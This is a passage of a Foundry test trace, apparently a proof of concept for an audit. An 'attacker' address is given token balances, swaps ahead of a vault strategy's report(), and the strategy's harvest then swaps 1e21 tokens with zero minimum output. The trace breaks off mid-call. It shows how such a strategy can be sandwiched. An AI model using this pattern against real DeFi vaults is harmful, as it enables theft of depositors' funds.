    ├─ [908] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   ├─ [507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   └─ ← [Return] 32428981123628 [3.242e13]
    │   └─ ← [Return] 32428981123628 [3.242e13]
    ├─ [0] VM::revertTo(0)
    │   └─ ← [Return] true
    ├─ [2374] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::minAmountToSell() [staticcall]
    │   └─ ← [Return] 0
    ├─ [2566] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::minAmountToSellMapping(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] 0
    ├─ [9664] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::decimals() [staticcall]
    │   ├─ [2460] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::decimals() [delegatecall]
    │   │   └─ ← [Return] 18
    │   └─ ← [Return] 18
    ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef], []
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, slot: 62383759998050452719176739997299241539497671211442363241994204971096751849199 [6.238e76])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, fsig: 0x70a08231, keysHash: 0x04f2f6350d549d0b09e534b5449b3e137ced476ed49ffeff61284a278d4cde74, slot: 62383759998050452719176739997299241539497671211442363241994204971096751849199 [6.238e76])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0x00000000000000000000000000000000000000000000003635c9adc5dea00000)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15], []
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, fsig: 0x70a08231, keysHash: 0x95e39942d3d4e3c52b847ed093f9085ab6d2d9a023036bf9d1450847eda30f16, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 500000000000000000000 [5e20]
    │   └─ ← [Return] 500000000000000000000 [5e20]
    ├─ [9642] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::decimals() [staticcall]
    │   ├─ [2438] 0x5e875267f65537768435C3C6C81cd313a570B422::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ [3486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [2758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15], []
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, fsig: 0x70a08231, keysHash: 0x95e39942d3d4e3c52b847ed093f9085ab6d2d9a023036bf9d1450847eda30f16, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x000000000000000000000000000000000000000000000000000000003b9aca00)
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 1000000000 [1e9]
    │   └─ ← [Return] 1000000000 [1e9]
    ├─ [5408] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   ├─ [2507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   └─ ← [Return] 30567291587044 [3.056e13]
    │   └─ ← [Return] 30567291587044 [3.056e13]
    ├─ [2742] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::uniFees(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36) [staticcall]
    │   └─ ← [Return] 500
    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return]
    ├─ [27318] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [26608] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], spender: 0x4e1d81A3E627b9294532e990109e4c21d217376C, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [5906553] 0x4e1d81A3E627b9294532e990109e4c21d217376C::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, tokenOut: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, fee: 500, recipient: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, deadline: 1764232342 [1.764e9], amountIn: 500000000000000000000 [5e20], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   ├─ [5899092] 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B::swap(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], false, 500000000000000000000 [5e20], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
    │   │   ├─ [11013] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::transfer(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1286556596474 [1.286e12])
    │   │   │   ├─ [10282] 0x5e875267f65537768435C3C6C81cd313a570B422::transfer(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1286556596474 [1.286e12]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], value: 1286556596474 [1.286e12])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   └─ ← [Return] 1533847496599926410526 [1.533e21]
    │   │   │   └─ ← [Return] 1533847496599926410526 [1.533e21]
    │   │   ├─ [11017] 0x4e1d81A3E627b9294532e990109e4c21d217376C::uniswapV3SwapCallback(-1286556596474 [-1.286e12], 500000000000000000000 [5e20], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
    │   │   │   ├─ [6915] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::transferFrom(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 500000000000000000000 [5e20])
    │   │   │   │   ├─ [6199] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::transferFrom(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 500000000000000000000 [5e20]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, value: 500000000000000000000 [5e20])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   └─ ← [Return] 2033847496599926410526 [2.033e21]
    │   │   │   └─ ← [Return] 2033847496599926410526 [2.033e21]
    │   │   ├─ emit Swap(param0: 0x4e1d81A3E627b9294532e990109e4c21d217376C, param1: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], param2: -1286556596474 [-1.286e12], param3: 500000000000000000000 [5e20], param4: 1814727027513135426164891083175509 [1.814e33], param5: 35024192295240372 [3.502e16], param6: 200792 [2.007e5])
    │   │   └─ ← [Return] 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffed47340470600000000000000000000000000000000000000000000001b1ae4d6e2ef500000
    │   └─ ← [Return] 1286556596474 [1.286e12]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::prank(0xC29cbdcf5843f8550530cc5d627e1dd3007EF231)
    │   └─ ← [Return]
    ├─ [2005458] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::report()
    │   ├─ [2005054] 0xD377919FA87120584B21279a491F82D5265A139c::report() [delegatecall]
    │   │   ├─ [1961092] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::harvestAndReport()
    │   │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   ├─ [3989] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [staticcall]
    │   │   │   │   ├─ [3258] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [3318] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 0)
    │   │   │   │   ├─ [2608] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 0) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, spender: 0x4e1d81A3E627b9294532e990109e4c21d217376C, value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1989] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [staticcall]
    │   │   │   │   ├─ [1258] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [23218] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 1000000000000000000000 [1e21])
    │   │   │   │   ├─ [22508] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 1000000000000000000000 [1e21]) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, spender: 0x4e1d81A3E627b9294532e990109e4c21d217376C, value: 1000000000000000000000 [1e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1453688] 0x4e1d81A3E627b9294532e990109e4c21d217376C::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, tokenOut: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, fee: 500, recipient: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, deadline: 1764232342 [1.764e9], amountIn: 1000000000000000000000 [1e21], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   │   │   │   ├─ [1448727] 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B::swap(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, false, 1000000000000000000000 [1e21], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000078ec25fba1baf6b7dc097ebb8115a390a2a4ee12000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
    │   │   │   │   │   ├─ [26113] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::transfer(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 808477226023 [8.084e11])
    │   │   │   │   │   │   ├─ [25382] 0x5e875267f65537768435C3C6C81cd313a570B422::transfer(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 808477226023 [8.084e11]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, to: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, value: 808477226023 [8.084e11])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 2033847496599926410526 [2.033e21]
    │   │   │   │   │   │   └─ ← [Return] 2033847496599926410526 [2.033e21]
    │   │   │   │   │   ├─ [8599] 0x4e1d81A3E627b9294532e990109e4c21d217376C::uniswapV3SwapCallback(-808477226023 [-8.084e11], 1000000000000000000000 [1e21], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000078ec25fba1baf6b7dc097ebb8115a390a2a4ee12000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
    │   │   │   │   │   │   ├─ [4497] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::transferFrom(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 1000000000000000000000 [1e21])
